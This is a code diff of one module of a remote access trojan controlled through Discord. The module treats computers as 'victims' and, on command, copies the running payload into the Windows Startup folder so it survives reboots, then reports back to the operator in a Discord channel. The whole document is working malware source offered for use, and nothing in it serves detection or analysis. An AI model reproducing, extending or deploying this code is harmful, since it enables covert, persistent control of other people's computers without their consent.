@@ -1,8 +1,9 @@
 import disnake as discord
 from disnake.ext import commands
 from datetime import datetime
+from sys import executable
 
-import os, requests
+import os, requests, subprocess
 nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"
 
 class Startup(commands.Cog):
@@ -17,15 +18,48 @@ class Startup(commands.Cog):
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
         """
-        if str(victim) == str(self.ip_addr):
-            from sys import executable; msg = "```\n"
-            await ctx.response.send_message(embed = Embed(title = "Last known RAT directory: \n" + original_dir + "\n\nCurrent Directory: \n" + os.getcwd(), color = 0x0081FA))
-            os.chdir(original_dir)
-            await ctx.followup.send(embed = Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
-            subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        if str(victim) == str(self.bot.identifier):
+            msg = "```\n"
+            
+            await ctx.response.send_message(
+                embed = discord.Embed(
+                    title = "Last known RAT directory: \n" + self.bot.original_dir + "\n\nCurrent Directory: \n" + os.getcwd(), 
+                    color = 0x000000
+                )
+            )
+            
+            os.chdir(self.bot.original_dir)
+            
+            await ctx.channel.send(
+                embed = discord.Embed(
+                    title = "Trying to copy payload into startup directory...", 
+                    color = 0x000000
+                )
+            )
+            
+            subprocess.run(
+                f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', 
+                shell=True, 
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE, 
+                stdin=subprocess.PIPE
+            )
+            
             os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-            for value in os.listdir(): msg += f'{value}\n'
-            msg += "```"; await ctx.followup.send(msg, embed=Embed(title="If you see the program here, you're good to go: ", color=0x0081FA))
-
+            
+            for value in os.listdir(): 
+                msg += f'{value}\n'
+            
+            msg += "```"
+            await ctx.channel.send( 
+                embed=self.bot.genEmbed(
+                    "If you see the program here, you're good to go: ",
+                    datetime.now()
+                )
+            )
+            
+            await ctx.channel.send(msg)
+            os.chdir(self.bot.original_dir)
+            
 def setup(bot: commands.Bot):
     bot.add_cog(Startup(bot)) 
